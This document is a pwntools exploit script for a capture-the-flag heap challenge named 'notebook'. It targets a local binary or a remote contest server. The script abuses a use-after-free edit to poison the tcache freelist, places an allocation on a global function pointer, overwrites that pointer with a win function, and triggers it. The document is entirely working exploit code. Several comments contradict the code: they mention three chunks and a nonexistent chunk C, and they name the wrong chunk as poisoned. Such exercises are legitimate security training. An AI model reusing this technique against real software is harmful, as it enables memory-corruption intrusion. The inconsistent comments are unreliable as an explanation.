#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./notebook', checksec=False)

def conn():
    if args.REMOTE:
        return remote('offsec.m0lecon.it', 13576)
    return process(elf.path)

p = conn()

win_addr       = elf.sym.win
global_handler = elf.sym.global_handler

log.info(f"win:            {hex(win_addr)}")
log.info(f"global_handler: {hex(global_handler)}")

def alloc(idx, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'data: ', data)

def show(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index: ', str(idx).encode())
    return p.recvuntil(b'\n')

def trigger():
    p.sendlineafter(b'> ', b'5')

# Need 3 real chunks in tcache so the 4th alloc lands at global_handler
alloc(0, b'A' * 0x60)   # chunk A
alloc(1, b'B' * 0x60)   # chunk B

free(0)   # tcache: [A] → NULL           count=1
free(1)   # tcache: [B] → A → NULL       count=2

# Poison the BOTTOM of the chain (chunk A, freed first = last in list)
# A.fd = global_handler  →  chain: C → B → A → global_handler
edit(1, p64(global_handler))

alloc(2, b'X')
alloc(3, p64(win_addr))   # chunk at global_handler
# Verify

trigger()

p.interactive()